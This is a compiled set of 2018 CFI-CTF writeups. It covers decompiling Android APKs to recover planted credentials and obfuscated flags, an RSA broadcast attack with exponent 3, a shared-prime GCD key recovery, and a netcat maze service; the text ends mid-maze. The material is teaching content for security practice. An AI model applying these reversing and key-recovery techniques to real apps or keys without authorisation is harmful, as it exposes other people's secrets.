<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-cfi-ul
description: CTF writeups and security challenges by CFI-UL.
---

# Writeups by CFI-UL

Source repository: `/repos/CFI-UL`

## Repository Index

- 2018-CFI-CTF/README.md
- 2018-CFI-CTF/CFI-in-Kotlin/README.md
- 2018-CFI-CTF/Chinese_Food/README.md
- 2018-CFI-CTF/Congolexicomatisation/README.md
- 2018-CFI-CTF/FlagCollection/README.md
- 2018-CFI-CTF/Labyrinth/README.md
- 2018-CFI-CTF/SOHOpelesslyBroken/README.md
- 2018-CFI-CTF/automated_reversing/README.md
- 2018-CFI-CTF/awesome-cats/README.md
- 2018-CFI-CTF/cheese-factory/README.md
- 2018-CFI-CTF/dayjavous/README.md
- 2018-CFI-CTF/equation_solving/README.md
- 2018-CFI-CTF/ez_flag_cfi/README.md
- 2018-CFI-CTF/fuck/README.md
- 2018-CFI-CTF/guess_the_number/README.md
- 2018-CFI-CTF/hacking-tool/README.md
- 2018-CFI-CTF/hercule/README.md
- 2018-CFI-CTF/introToPE/README.md
- 2018-CFI-CTF/kadyrovs_cat/README.md
- 2018-CFI-CTF/magic_word/README.md
- 2018-CFI-CTF/maths/README.md
- 2018-CFI-CTF/powerPacker/README.md
- 2018-CFI-CTF/serverless_cfi_λ/README.md
- 2018-CFI-CTF/thirteen-steps/README.md
- 2018-CFI-CTF/unix_drive/README.md
- 2018-CFI-CTF/webLogon-capture/README.md
- 2018-CFI-CTF/windows_xp_mem_part1/README.md
- 2018-CFI-CTF/windows_xp_mem_part2/README.md
- 2018-CFI-CTF/cheese-factory/src/README.md
- 2018-CFI-CTF/awesome-cats/src/README.md
- 2018-CFI-CTF/awesome-cats/src/secret/journal.md
- 2018-CFI-CTF/awesome-cats/src/secret/nodes.md
- 2018-CFI-CTF/awesome-cats/src/secret/secret.md
- 2018-CFI-CTF/awesome-cats/src/secret/todo.md

## Writeup Content


### File: 2018-CFI-CTF/CFI-in-Kotlin/README.md

# CFI-in-Kotlin

> mobile

Author: [sagold](https://github.com/Sag0ld)

Q-Q-Q-Q-uack?
CFI has is first mobile Apppp!
Try to get his se-se-se-cret
Try to be M-M-Me
To wi-n-n-n... Experieeence?
QUACKKKK!


## Writeup

For the CFI-in-Kotlin challenge,
you need a tool to extract data from cfi-event.apk
You can use jadx or apktool to extract your data, but I prefer jadx for his simplicity.

``` bash
jadx -d cfi-event cfi-event.apk
```

When you're done extracting the .apk, you can navigate into your folder to find the source code.
If you are use to mobile application, the standard package name always begin with:
> com.<company-name>.<app-name>.

With that being said, it's easy to find the main source code.

There, we see something that we're not use to. Extracting apk is rarely clean as when we develop an application.
- Kotlin have many feature to reduce the number of code we write.
- jadx split inner classes and anonymous classes into <class-name>$<method-name>$<number>.

method-name: refer to the method containing anonymous or innerClass.
number: is to specified which class it's.

Whit that being said, in this challenge we see LoginActivity and InformationActivity as mainClass.

As the challenge description say, « Try to be Me »,  we can assume that we need to do something related to the creator.
Like we said earlier we have a LoginActivity... ~~Odd isn't it ?~~

If we read the LoginActivity, we can find some errors of extracting data, but you can also see the logic behind the app.
And most important, variable! We have dummy credential!

> Email: alerionMascot@CFIUL.com
> Password: HappyFirstYear

With those email and password you can maybe... be the creator!?

Now, install the cfi-event app in you emulator or phone. (You can see in the androidManisfest.xml file which version you need to run the app.)
Let's sign in with the cred we found in the LoginActivity.

With a internet connection, the flag will appear under the CFI logo.

> Flag: CFI{DOUMMY_creeeeeddddd_issSoFriENDlieee_QUACKKKK}

I hope you liked this challenge.



### File: 2018-CFI-CTF/Chinese_Food/README.md

# Chinese_Food

I've sent a few of my friends the secret location of my birthday party. I really don't want the evil Eve to come and crash the party you see.
I sure hope it was a good idea to send the message without any *padding* or *armoring*.

The three messages are the same. Find a way to retrieve the message without breaking the key. (You can try to break the key if you want, but chances are against you :D)

> crypto

## Setup

If you want to generate random challenge, randomize the seed.

Run challenge.py to generate 3 ciphers and their 3 public keys
Zip the challenge folder and upload it. The message is the same in all cipher.

## Writeup

The challenge tells us that all messages are the same, without any armoring.
Furthermore, our public exponent is 3 and we have 3 messages.
This is probably vulnerable to the Chinese Remainder Attack.

The theorem states that provided you have `n` coprime divisor (the public moduli) and `n` remainder, you can find the base which satisfies the system for all cases.

This means that by having 3 copies of the same message, encrypted with 3 different public key using 3 as the public exponent, we can decrypt the message.

This is mostly mathematical, but using the implementation from https://mail.python.org/pipermail/edu-sig/2001-August/001665.html, we can find the value of message^3.
We then only need to find the cube root of the integer to find the decrypted value of the block.

Since the numbers are big, we can use this simple algorithm to find the integer part of the root as we know it's a perfect cube.
```python
def root(x,n):
     """Finds the integer component of the n'th root of x,
     an integer such that y ** n <= x < (y + 1) ** n.
     """
     high = 1
     while high ** n < x:
         high *= 2
     low = high/2
     while low < high:
         mid = (low + high) // 2
         if low < mid and mid**n < x:
             low = mid
         elif high > mid and mid**n > x:
             high = mid
         else:
             return mid
     return mid + 1```

We then obtain the integer value of the hex encoded ASCII. We can retrieve the original message by doing
`bytearray.fromhex(hex(value)[2:]).decode()

And we get b'Good job, here is your flag : CFI{this_is_the_reason_we_either_armor_our_message_or_dont_use_3_as_the_public_exponent}. Want a side of dumpling with it?\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c\x1c'




### File: 2018-CFI-CTF/Congolexicomatisation/README.md

# Congolexicomatisation

Me and my friends are testing out that new crypto system.
It is RSA based but use that super duper prime number generator made by the first congolese scholar.
Just like Eddy Malou, this prime generator repeats itself, **a lot**. Maybe too much for cryptographic applications?

In order to make sure it's secure, I encrypted 50 variants of our secret message using 50 public keys.
Can you find the two vulnerable keys, retrieve their private key and decrypt their message?

> crypto

## Setup

If you want to generate random challenge, randomize the seed.
1. Run challenge.py to generate 50 ciphers and their 50 public keys
2. Zip the challenge folder and upload it. Two of the public keys share a prime. Which one does is random.
For the current seed, it is key35 and key39

## Writeup

We are provided with many cipher texts and the public keys used to encrypt them.
There is a good hint in the challenge description stating that the number generator repeats itself.
If it repeats primes used in the keypair, we can break two keys that share this repeated prime.
By using the Euclidean algorithm for GCD (greater common divisor), if we find two factors between two public keys modulus that are not `1`, we definitively know that they share this prime.

We load all modulus into an array and try to find a GCD that is not one. Pretty fast, we find this prime that is used in key35 and key39

`230017159194752100203407138276965345342141092280537395159590297592543645444449`

By dividing both modulus by this prime, we find the respective other prime. From there, we just have to generate a new keypair to find both private keys.

We decrypt both messages and find the flag, padded with random characters.

`CFI{yo_mama_never_told_you_to_use_decent_prng_boy??}`




### File: 2018-CFI-CTF/FlagCollection/README.md

# FlagCollection 🚩

> mobile

Author: [lilc4t](https://github.com/masterT)

Simple mobile application that allow you to submit valid flags to your collection. You can only submit 3 flags the moment.


## Setup

### Development

Check out the [React Native documentation](https://facebook.github.io/react-native/).

### Build

Build the APK:

```shell
$ src/android/gradlew assembleRelease -p src/android/
```

This generates `src/android/app/build/outputs/apk/release/app-release.apk`.

```shell
$ mv src/android/app/build/outputs/apk/release/app-release.apk FlagCollection.apk
```

## Writeup

A good place to start is to run the application on your device or the Android emulator that is shipped with [Android Studio](https://developer.android.com/studio/).

To install the APK in your emulator or on your _connected_ device:

```
adb install FlagCollection.apk
```

When you open the application we see the CFI logo and an empty list of flag. There is `"Submit flag"` button that open a modal box from where you can submit a flag. When you press the `"Submit" `button in the modal box we'll see the message `"Invalid flag! Try harder!"`. These strings will help us navigate through the source code.

Now decompile the APK using [jadx](https://github.com/skylot/jadx).

```
$ jadx -d decompiled FlagCollection.apk
```

This will create the directory `decompiled` with `resources` and `sources` directories:

```
$ tree -L 2 decompiled/
decompiled/
├── resources
│   ├── AndroidManifest.xml
│   └── res
└── sources
    ├── android
    ├── bolts
    ├── com
    ├── javax
    ├── okhttp3
    ├── okio
    └── org

10 directories, 1 file
```

If you open `decompiled/resources/AndroidManifest.xml` you'll see the reference to the application code.

```xml
<!-- ... -->
<application android:theme="@style/AppTheme" android:label="@string/app_name" android:icon="@mipmap/ic_launcher" android:name="com.flagcollection.MainApplication" android:allowBackup="false">
    <!-- ... -->
</application>
<!-- ... -->
```

In this case it's `com.flagcollection.MainApplication`. The namespace is `com.flagcollection`. Here are the files that belong to this namespace:

```
$ ls -1  decompiled/sources/com/flagcollection
BuildConfig.java
MainActivity.java
MainApplication.java
R.java
ValidateFlag3.java
ValidateFlag3Package.java
```

Let's check the source code of the `MainApplication`.

When can see the `MainApplication` implements the `ReactApplication` from the package [com.facebook.react.ReactApplication](https://github.com/facebook/react-native/blob/master/ReactAndroid/src/main/java/com/facebook/react/ReactApplication.java). So the application is a React Native. It means it bundle JavaScript code and execute it from the Java code. More information [here](https://www.reactnative.guide/3-react-native-internals/3.1-react-native-internals.html).

Let's find the JavaScript code. For that we need to decompress the APK. Since an APK file is just Zip archive you can unzip it!

```
$ file FlagCollection.apk
FlagCollection.apk: Zip archive data, at least v2.0 to extract
```

```
$ unzip FlagCollection.apk -d unarchived
```

The JavaScript code is located at `unarchived/assets/index.android.bundle`. It's minified so let's un-minified it using [js-beautify](https://www.npmjs.com/package/js-beautify).

```
$ js-beautify -s 2 -f unarchived/assets/index.android.bundle -o index.js
```

This generate the file `index.js` using an indentations of 2 spaces.

Let's search some of the key strings we noted.

String: `Invalid flag! Try harder!`

```
$ grep -n -i 'Invalid flag! Try harder!' index.js
23890:            t ? (n.ToastAndroid.show('Good job!', n.ToastAndroid.SHORT), l.props.onSubmitSuccess(e), l.hideModal()) : n.ToastAndroid.show('Invalid flag! Try harder!', n.ToastAndroid.SHORT), l.setState({
```

Line 23890.

Let read the code arround the line 23890.


```js
l.submitFlag = function() {
  var e = l.state.flag;
  (0, i.validateFlag)(e).then(function(t) {
    t ? (n.ToastAndroid.show('Good job!', n.ToastAndroid.SHORT), l.props.onSubmitSuccess(e), l.hideModal()) : n.ToastAndroid.show('Invalid flag! Try harder!', n.ToastAndroid.SHORT), l.setState({
      flag: ''
    })
  })
}
```

Let's refactor the code.

```js
l.submitFlag = function() {
  var flag = l.state.flag;
  (0, i.validateFlag)(flag)
    .then(function (valid) {
      if (valid) {
        n.ToastAndroid.show('Good job!', n.ToastAndroid.SHORT)
        l.props.onSubmitSuccess(flag)
        l.hideModal()
      } else {
        n.ToastAndroid.show('Invalid flag! Try harder!', n.ToastAndroid.SHORT)
      }
      l.setState({flag: ''})
    })
}
```

It call a function `validateFlag` and that returns a Promise, then it it resolve with a true value it display `"Good job!"` otherwise it display `"Invalid flag! Try harder!"`. Let's find the definition of this function.

Can't find it in the context, [Babel](https://babeljs.io/) transpiled code is to messed up. Let's grep the code.

```
$ grep -n 'validateFlag' index.js
23889:          (0, i.validateFlag)(e).then(function(t) {
23964:  }), r.validateFlag = function(n) {
```

It looks like it's defined at the line 23964.

```js
r.validateFlag = function(n) {
  return c(n).then(function(e) {
    return !!e || [a, f].some(function(e) {
      return e(n)
    })
  })
};
```

Refactored:

```js
// n -> flag
r.validateFlag = function (flag) {
  // c -> validation1
  return validation1(flag)
    .then(function(e) {
      if (e) {
        return true
      } else {
        // a -> validation2
        // f -> validation3
        return [validation2, validation3].some(function (validation) {
          return validation(flag)
        })  
      }
    })
};
```

So it calls the function `validation1` (previously `c`) with the argument `flag` (previously `n`) that returns a Promise, then if it resolve with a positive value, it return `true`, otherwise, it return if the functions `validation2` and `validation3` (previously `a` and `f`) returned a `true` value with the `flag`.

Just below the function there is the tree function `c`, `a` and `f`. Let's check them one by one.


## Flag 1

```js
function c(n) {
  return new Promise(function(e) {
    i.NativeModules.ValidateFlag3.validate(n, function(n) {
      e(n)
    })
  })
}
```

Refactored:

```js
function validation1 (flag) {
  return new Promise(function (resolve) {
    i.NativeModules.ValidateFlag3.validate(flag, function (valid) {
      resolve(valid)
    })
  })
}
```

It looks like it uses [NativeModules](https://facebook.github.io/react-native/docs/native-modules-ios) which allows to call native code (in this case Java code) from JavaScript. It calls the `validate` methods of the native module `ValidateFlag3`.

Native modules are added in `MainApplication.java`. Indeed there is a package `ValidateFlag3Package`.

```java
// ...
protected List<ReactPackage> getPackages() {
    return Arrays.asList(new ReactPackage[]{new MainReactPackage(), new ValidateFlag3Package()});
}
// ...
```

Now let's take a look to `ValidateFlag3Package.java`.

```java
// ...
public class ValidateFlag3Package implements ReactPackage {
    public List<ViewManager> createViewManagers(ReactApplicationContext reactContext) {
        return Collections.emptyList();
    }

    public List<NativeModule> createNativeModules(ReactApplicationContext reactContext) {
        List<NativeModule> modules = new ArrayList();
        modules.add(new ValidateFlag3(reactContext));
        return modules;
    }
}
```

It add the module `ValidateFlag3`. Let's open `ValidateFlag3.java`.

```java
// ....
public class ValidateFlag3 extends ReactContextBaseJavaModule {
    private static final String[] compositeKey = new String[]{"hUZAf9gFIARRFTAvKRDs8A==", "gp9jPELztMsd51Ih81gO0Q=="};
    private static final String flag3 = "RJ9qOOqa7pAinT19vyuQRHOGSi3FnPW5La0BYb4tnw==";

    public ValidateFlag3(ReactApplicationContext reactContext) {
        super(reactContext);
    }

    public String getName() {
        return "ValidateFlag3";
    }

    public byte[] getKey() {
        byte[] parts0 = Base64.decode(compositeKey[0], 2);
        byte[] parts1 = Base64.decode(compositeKey[1], 2);
        byte[] key = new byte[parts0.length];
        for (int i = 0; i < parts1.length; i++) {
            key[i] = (byte) (parts0[i] ^ parts1[i]);
        }
        return key;
    }

    @ReactMethod
    public void validate(String flag, Callback callback) {
        byte[] key = getKey();
        byte[] encryptedFlag = flag.getBytes();
        for (int i = 0; i < encryptedFlag.length; i++) {
            encryptedFlag[i] = (byte) (encryptedFlag[i] ^ key[i % key.length]);
        }
        Boolean valid = Boolean.valueOf(flag3.equals(Base64.encodeToString(encryptedFlag, 2)));
        callback.invoke(valid);
    }
}
```

Bingo we found the `validate` method. Let's see what we have here. It call `getKey` and set the `flag` bytes in variable `encryptedFlag`. Then it performs on each byte of the given `flag` (set as `encryptedFlag`) a [XOR](https://en.wikipedia.org/wiki/XOR_gate) using the operator [^](https://docs.oracle.com/javase/specs/jls/se7/html/jls-15.html#jls-15.22.2). Finally it compares the base64 value of the `encryptedFlag` with the static constant `flag3`.

So to retrieve the flag we need to XOR `flag3` with the `key`.

The `getKey` method initialize a buffer of byte `key`, takes each part of the `compositeKey` and decode the base64 value in `parts0` and `parts1`. Then it performs on each byte of `parts0` a XOR and set the result at the byte position in the buffer `key`. Finally it returns `key`.

So to generate the `key` when need to XOR `compositeKey[0]` with `compositeKey[1]`.

You can use [cryptii](https://cryptii.com/bitwise-calculator) or other tool online to do it.

But first we need to get the hexadecimal value from base64 of those strings, you can use https://kt.gy/tools.html or other tool online.

```
flag3
(base64) RJ9qOOqa7pAinT19vyuQRHOGSi3FnPW5La0BYb4tnw==
(hexadecimal) 44 9f 6a 38 ea 9a ee 90 22 9d 3d 7d bf 2b 90 44 73 86 4a 2d c5 9c f5 b9 2d ad 01 61 be 2d 9f

compositeKey[0] 
(base64) hUZAf9gFIARRFTAvKRDs8A==
(hexadecimal) 85 46 40 7f d8 05 20 04 51 15 30 2f 29 10 ec f0

compositeKey[1] 
gp9jPELztMsd51Ih81gO0Q==
(hexadecimal) 82 9f 63 3c 42 f3 b4 cb 1d e7 52 21 f3 58 0e d1

key = compositeKey[0] ^ compositeKey[1] 
(base64) B9kjQ5r2lM9M8mIO2kjiIQ==
(hexadecimal) 07 d9 23 43 9a f6 94 cf 4c f2 62 0e da 48 e2 21

flag = flag3 ^ key
(base64) Q0ZJe3Bsel9ub19zZWNyZXRfaW5famF2YV9jb2RlfQ==
(hexadecimal) 43 46 49 7b 70 6c 7a 5f 6e 6f 5f 73 65 63 72 65 74 5f 69 6e 5f 6a 61 76 61 5f 63 6f 64 65 7d
(ascii) CFI{plz_no_secret_in_java_code}
```

There we have the first flag! 


## Flag 2

Now let's go back to the JavaScript code and take a look at the function `validation2` (previous `a`).

```js
function a(n) {
  return o.Buffer.from('Q0ZJe2Jhc2U2NF9pc19ub3Rfc2VjdXJlfQ==', 'base64').toString('ascii') === n
}
```

Refactored:

```js
function validation2 (flag) {
  return o.Buffer.from('Q0ZJe2Jhc2U2NF9pc19ub3Rfc2VjdXJlfQ==', 'base64').toString('ascii') === flag
}
```

It looks like it that the string `Q0ZJe2Jhc2U2NF9pc19ub3Rfc2VjdXJlfQ==`, and decode the base64 value and then compare it with the `flag`. So we just need to decode the string to get the flag.

You can use https://kt.gy/tools.html or other tool online.

```
(base64) Q0ZJe2Jhc2U2NF9pc19ub3Rfc2VjdXJlfQ==
(ascii) CFI{base64_is_not_secure}
```

Yeah we have to second flag!


## Flag 3

Now let's go back a last time and take a look at the last function `validation3` (previous `f`).

```js
function f(n) {
  for (var e = [], t = 2, r = 0; r < n.length; r++) {
    1 & r ? t += 13 : t -= n.length % 9;
    var u = n.charCodeAt(r) + t;
    e.push(u)
  }
  return '64,80,78,141,124,124,123,151,144,141,134,166,146,158,148,172,158,192,166,197,176,204,190,210,209,201,206,229,204,232,228,246,220,253,234,245,258,268,250,262,282' === e.join(',')
}
```

Refactored:

```js
function validation3 (flag) {
  var buffer = []
  var something = 2
  for (var i = 0; i < flag.length; i++) {
    if (1 & i) {
      something += 13
    } else {
      something -= flag.length % 9
    } 
    var value = flag.charCodeAt(i) + something;
    buffer.push(value)
  }
  return '64,80,78,141,124,124,123,151,144,141,134,166,146,158,148,172,158,192,166,197,176,204,190,210,209,201,206,229,204,232,228,246,220,253,234,245,258,268,250,262,282' === buffer.join(',')
}
```

Let's reverse the function:

```js
var codes = '64,80,78,141,124,124,123,151,144,141,134,166,146,158,148,172,158,192,166,197,176,204,190,210,209,201,206,229,204,232,228,246,220,253,234,245,258,268,250,262,282'.split(',').map(function (i) {
  return parseInt(i)
})

var flag = ''
var something = 2
for (var i = 0; i < codes.length; i++) {
  // Is odd?
  if (1 & i) {
    something += 13
  } else {
    // Flag length is the codes length.
    something -= codes.length % 9
  }
  var character = String.fromCharCode(codes[i] - something)
  flag += character
}

console.log(flag)
// CFI{obfuscated_javascript_is_not_secured}
```

Awesome we have the last flag! 



### File: 2018-CFI-CTF/Labyrinth/README.md

# Labyrinth

> programming

Author: [filedesless](https://github.com/filedesless)

`localhost:24001`

You have 2 seconds to send back a valid path between S and E
(ex: RIGHT,RIGHT,RIGHT,DOWN,RIGHT,RIGHT,UP,UP,UP,UP,UP,LEFT)

Here are some interesting reads: 

 - https://docs.python.org/3/library/socket.html
 - https://en.wikipedia.org/wiki/Algorithm

## Setup

Requirements:
- docker

Start:

```shell
docker-compose up
```

## Writeup

The challenge is a service running on port 24001, the user have to connect to it with a tool like netcat.

```
λ $ nc localhost 24001
You have 2 seconds to send back a valid path between S and E
(ex: RIGHT,RIGHT,RIGHT,DOWN,RIGHT,RIGHT,UP,UP,UP,UP,UP,LEFT)
+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+
+,+, , , ,+, , , , , , , ,+, , , ,+, , , ,+, , , , , , , ,+, , , , , ,+, , , , , , , ,+, , , , , , , , , , , , , , , , , ,+, , , , , , , , , ,+, , , , , , , , , ,+, , , , , ,+,+
+,+,+,+, ,+, ,+,+,+, ,+,+,+, ,+, ,+, ,+, ,+, ,+, ,+,+,+, ,+, ,+,+,+, ,+, ,+,+,+,+,+, ,+, ,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+, ,+,+,+,+,+, ,+,+,+, ,+, ,+, ,+,+,+,+,+,+,+, ,+, ,+,+,+,+
+,+, , , ,+, , , ,+, , , , , ,+, ,+, ,+, , , ,+, , , ,+, , , ,+, ,+, ,+, , , , , ,+, , , ,+, , , , , , , , , , , , , ,+, , , ,+, , , ,+, ,+, ,+, ,+, , , , , ,+, , , ,+, , , ,+,+
+,+, ,+,+,+,+,+, ,+,+,+,+,+,+,+, ,+, ,+,+,+,+,+,+,+, ,+,+,+,+,+, ,+, ,+,+,+,+,+, ,+,+,+,+,+, ,+,+,+,+,+,+,+,+,+,+,+,+,+,+,+, ,+, ,+,+,+, ,+, ,+,+,+,+,+, ,+, ,+, ,+,+,+,+,+, ,+,+
+,+, ,+, , , , , ,+, , , ,+, ,+, , , ,+, ,+, , , , , ,+, , , , , ,+, ,+, , , ,+, , , ,+, , , , , , , , , , , ,+, , , , , , , ,+, ,+, , , ,+, , , , , ,+, ,+, , , ,+, ,+, , , ,+,+
+,+, ,+, ,+,+,+,+,+, ,+, ,+, ,+,+,+,+,+, ,+, ,+,+,+,+,+,+,+, ,+,+,+, ,+, ,+, ,+,+,+, ,+,+,+, ,+,+,+,+,+,+,+, ,+, ,+,+,+,+,+,+,+, ,+, ,+, ,+,+,+,+,+, ,+,+,+,+,+, ,+, ,+, ,+,+,+,+
+,+, ,+, ,+, , , , , ,+, ,+, , , ,+, , , ,+, ,+, , , , , ,+, , , , , ,+, ,+, , , ,+, , , ,+, , , , , ,+, , , ,+, ,+, , , , , , , ,+, ,+, , , , , ,+, , , , , ,+, ,+, ,+, , , ,+,+
+,+, ,+, ,+, ,+,+,+,+,+, ,+, ,+, ,+,+,+, ,+, ,+, ,+,+,+, ,+, ,+,+,+,+,+, ,+,+,+, ,+,+,+, ,+, ,+,+,+,+,+, ,+,+,+, ,+, ,+, ,+,+,+,+,+, ,+,+,+,+,+, ,+,+,+,+,+, ,+, ,+, ,+,+,+, ,+,+
+,+, ,+, ,+, , , , , ,+, , , ,+, , , ,+, ,+, ,+, , , ,+, ,+, , , ,+, , , , , ,+, , , , , ,+, ,+, , , , , ,+, , , ,+, ,+, , , ,+, , , ,+, ,+, , , , , ,+, , , ,+, , , , , ,+, ,+,+
+,+, ,+, ,+,+,+,+,+, ,+,+,+,+,+,+,+, ,+, ,+, ,+,+,+, ,+, ,+,+,+, ,+,+,+,+,+, ,+,+,+,+,+,+,+,+,+, ,+,+,+, ,+, ,+,+,+,+,+,+,+, ,+, ,+,+,+, ,+, ,+,+,+,+,+, ,+,+,+,+,+,+,+, ,+, ,+,+
+,+, ,+, ,+, , , , , ,+, , , , , , , ,+, ,+, ,+, , , ,+, , , ,+, , , , , ,+, ,+, , , ,+, , , ,+, , , ,+, ,+, , , , , ,+, , , ,+, ,+, , , ,+, , , , , ,+, , , , , ,+, , , ,+, , ,E
+,+, ,+, ,+, ,+,+,+,+,+, ,+,+,+,+,+,+,+, ,+, ,+, ,+,+,+,+,+, ,+,+,+,+,+, ,+, ,+, ,+, ,+, ,+, ,+,+,+, ,+,+,+,+,+,+,+, ,+, ,+,+,+, ,+, ,+,+,+,+,+,+,+, ,+,+,+,+,+, ,+,+,+,+,+, ,+,+
+,+, ,+, ,+, ,+, , , , , , , , , ,+, , , ,+, , , ,+, , , , , ,+, ,+, , , ,+, ,+, ,+, , , ,+, , , , , ,+, , , , , ,+, , , ,+, ,+, ,+, , , , , , , ,+, , , ,+, , , ,+, , , ,+, ,+,+
+,+, ,+, ,+, ,+,+,+,+,+,+,+,+,+, ,+, ,+,+,+,+,+,+,+, ,+,+,+,+,+, ,+, ,+,+,+, ,+, ,+,+,+,+,+,+,+,+,+,+,+, ,+, ,+,+,+,+,+,+,+, ,+, ,+,+,+, ,+,+,+, ,+,+,+, ,+, ,+,+,+, ,+, ,+, ,+,+
+,+, ,+, ,+, , , ,+, , , ,+, , , , , ,+, , , , , , , ,+, , , , , ,+, , , , , ,+, , , ,+, , , , , ,+, , , ,+, , , , , , , ,+, , , , , , , ,+, , , , , ,+, ,+, , , , , ,+, , , ,+,+
+,+, ,+, ,+, ,+, ,+, ,+, ,+,+,+,+,+,+,+, ,+,+,+,+,+,+,+,+,+, ,+,+,+,+,+,+,+,+,+, ,+, ,+, ,+,+,+, ,+, ,+,+,+,+,+,+,+,+,+, ,+, ,+,+,+,+,+,+,+,+,+,+,+, ,+, ,+,+,+,+,+,+,+,+,+, ,+,+
+,+, , , ,+, ,+, , , ,+, ,+, , , , , , , ,+, , , , , , , ,+, , , , , , , , , ,+, ,+, ,+, ,+, ,+, , , ,+, , , , , , , ,+, , , , , ,+, , , , , , , ,+, ,+, , , , , ,+, ,+, , , ,+,+
+,+, ,+,+,+,+,+,+,+,+,+, ,+, ,+,+,+,+,+,+,+, ,+, ,+,+,+, ,+,+,+,+,+, ,+,+,+, ,+, ,+, ,+, ,+, ,+,+,+,+,+, ,+,+,+, ,+,+,+,+,+,+,+,+,+, ,+,+,+,+,+, ,+,+,+, ,+,+,+, ,+, ,+, ,+,+,+,+
+,+, , , ,+, , , , , , , ,+, , , , , ,+, , , ,+, ,+, ,+, , , , , , , ,+, , , ,+, ,+, ,+, ,+, ,+, , , , , , , ,+, ,+, , , , , , , ,+, , , ,+, ,+, , , , , ,+, ,+, , , ,+, , , ,+,+
+,+,+,+, ,+, ,+,+,+,+,+, ,+,+,+,+,+, ,+,+,+,+,+, ,+, ,+,+,+, ,+,+,+,+,+,+,+, ,+,+,+, ,+, ,+, ,+, ,+,+,+,+,+,+,+, ,+, ,+,+,+,+,+, ,+,+,+, ,+, ,+,+,+,+,+,+,+, ,+,+,+, ,+,+,+, ,+,+
+,+, ,+, , , ,+, ,+, , , ,+, , , ,+, ,+, , , , , ,+, , , , , ,+, , , , , ,+, , , , , ,+, ,+, , , , , , , ,+, , , ,+, , , , , ,+, , , ,+, ,+, , , ,+, , , , , ,+, , , , , ,+, ,+,+
+,+, ,+,+,+,+,+, ,+, ,+,+,+, ,+, ,+, ,+, ,+,+,+,+,+,+,+,+,+,+,+, ,+,+,+, ,+,+,+,+,+, ,+, ,+,+,+, ,+,+,+,+,+, ,+, ,+,+,+,+,+, ,+,+,+, ,+, ,+, ,+, ,+, ,+,+,+, ,+, ,+,+,+,+,+, ,+,+
+,+, , , ,+, ,+, , , ,+, , , ,+, ,+, ,+, , , , , , , , , ,+, , , , , ,+, ,+, , , ,+, ,+, , , ,+, ,+, , , , , ,+, , , , , ,+, , , ,+, , , ,+, ,+, , , ,+, ,+, , , ,+, , , , , ,+,+
+,+, ,+, ,+, ,+, ,+,+,+, ,+,+,+,+,+, ,+, ,+,+,+,+,+,+,+, ,+, ,+,+,+,+,+, ,+, ,+,+,+, ,+,+,+, ,+, ,+, ,+,+,+,+,+,+,+,+,+, ,+,+,+, ,+, ,+,+,+,+,+, ,+,+,+, ,+,+,+,+,+, ,+,+,+,+,+,+
+,+, ,+, , , ,+, ,+, , , , , ,+, , , ,+, , , , , ,+, ,+, ,+, ,+, , , , , ,+, , , , , ,+, , , ,+, ,+, , , ,+, , , , , ,+, ,+, ,+, ,+, ,+, , , ,+, ,+, , , ,+, , , , , ,+, , , ,+,+
+,+, ,+,+,+,+,+, ,+, ,+,+,+, ,+, ,+,+,+,+,+,+,+, ,+, ,+, ,+, ,+, ,+,+,+,+,+,+,+,+,+,+,+, ,+,+,+, ,+,+,+, ,+,+,+, ,+,+,+, ,+, ,+, ,+,+,+, ,+, ,+, ,+,+,+, ,+, ,+,+,+,+,+,+,+, ,+,+
+,+, ,+, , , , , ,+, ,+, ,+, ,+, ,+, , , , , ,+, , , ,+, , , ,+, , , , , , , ,+, , , , , ,+, ,+, ,+, ,+, , , ,+, , , , , ,+, ,+, , , ,+, ,+, ,+, , , , , ,+, ,+, , , , , , , ,+,+
+,+, ,+, ,+,+,+,+,+, ,+, ,+, ,+, ,+,+,+,+,+, ,+,+,+, ,+,+,+,+,+,+,+,+,+,+,+, ,+, ,+,+,+,+,+, ,+, ,+, ,+,+,+, ,+, ,+,+,+,+,+, ,+,+,+, ,+, ,+, ,+, ,+,+,+,+,+, ,+, ,+,+,+,+,+,+,+,+
+,+, ,+, ,+, , , , , ,+, ,+, ,+, , , ,+, , , ,+, , , ,+, ,+, , , , , , , ,+, ,+, , , ,+, , , , , , , ,+, , , ,+, ,+, , , , , , , ,+, ,+, ,+, ,+, ,+, , , , , ,+, , , , , , , ,+,+
+,+, ,+, ,+, ,+,+,+,+,+, ,+, ,+,+,+, ,+, ,+,+,+, ,+,+,+, ,+, ,+, ,+,+,+, ,+, ,+,+,+, ,+,+,+,+,+, ,+,+,+, ,+,+,+, ,+, ,+,+,+, ,+, ,+, ,+, ,+, ,+,+,+, ,+,+,+,+,+,+,+, ,+,+,+, ,+,+
+,+, , , ,+, , , , , , , ,+, , , ,+, ,+, ,+, , , ,+, , , ,+, ,+, ,+, ,+, ,+, ,+, , , ,+, , , ,+, ,+, , , ,+, , , ,+, , , ,+, ,+, ,+, , , ,+, , , , , ,+, , , , , ,+, ,+, ,+, ,+,+
+,+, ,+,+,+,+,+,+,+, ,+,+,+,+,+, ,+, ,+, ,+, ,+,+,+, ,+, ,+, ,+, ,+, ,+, ,+, ,+, ,+,+,+, ,+, ,+,+,+, ,+,+,+, ,+,+,+,+,+, ,+, ,+,+,+,+,+,+,+,+,+,+,+,+,+, ,+,+,+, ,+, ,+, ,+, ,+,+
+,+, ,+, , , , , ,+, ,+, , , ,+, ,+, ,+, , , ,+, , , ,+, , , ,+, ,+, , , ,+, ,+, ,+, , , ,+, , , , , ,+, ,+, , , ,+, , , ,+, , , , , , , ,+, , , , , , , ,+, , , ,+, , , ,+, ,+,+
